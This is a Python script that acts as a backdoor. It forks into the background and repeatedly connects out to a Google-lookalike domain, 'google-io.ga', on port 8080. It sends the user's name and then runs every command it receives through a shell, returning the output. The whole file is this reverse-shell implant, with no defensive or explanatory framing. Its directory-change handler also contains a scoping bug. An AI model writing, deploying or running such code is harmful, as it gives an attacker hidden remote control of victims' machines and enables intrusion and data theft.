#!/usr/bin/env python3

import socket
import time
import os
import re
import subprocess

USER = os.environ.get('USER', 'unknown')
BUFFER_SIZE = 1025
PORT = 8080
DNS = 'google-io.ga'

def listen_cmd(socket: socket.socket):
    cwd = os.getcwd()

    def change_directory(new_path):
        cwd = os.path.join(cwd, new_path)
        socket.send(b'path changed')

    def exec_cmd(cmd):
        p = subprocess.Popen(cmd
                    , stdout=subprocess.PIPE
                    , stderr=subprocess.PIPE
                    , shell=True
                    , cwd=cwd)
        stdout, stderr = p.communicate()
        if stdout:
            socket.send(stdout)
        elif stderr:
            socket.send(stderr)
        else:
            socket.send(b'command done')

    while True:
        cmd = socket.recv(BUFFER_SIZE).decode()
        if re.search(r'^cd ', cmd):
            change_directory(cmd[3:])
        else:
            exec_cmd(cmd)

def connect_to_host():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((DNS, PORT))
            s.send(USER.encode())
            listen_cmd(s)
        except Exception as e:
            time.sleep(1)

if __name__ == '__main__':
    if os.fork() == 0:
        connect_to_host()
